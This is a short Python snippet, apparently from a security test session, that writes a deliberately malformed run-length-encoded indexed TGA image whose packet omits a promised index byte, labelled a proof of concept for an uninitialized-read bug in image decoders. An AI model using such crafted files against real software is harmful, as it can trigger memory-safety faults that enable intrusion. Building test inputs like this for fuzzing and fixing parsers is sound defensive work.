import struct
# RLE indexed TGA: 1x1, full 256-color 24-bit palette initialized, raw packet says one index but omits byte.
hdr=struct.pack('<BBBHHBHHHHBB',0,1,9,0,256,24,0,0,1,1,8,0x20)
palette=bytes([0])*768
open('/workspace/poc_tga_rle_index_uninit_idx.tga','wb').write(hdr+palette+bytes([0x00]))
print(18+768+1)
PY
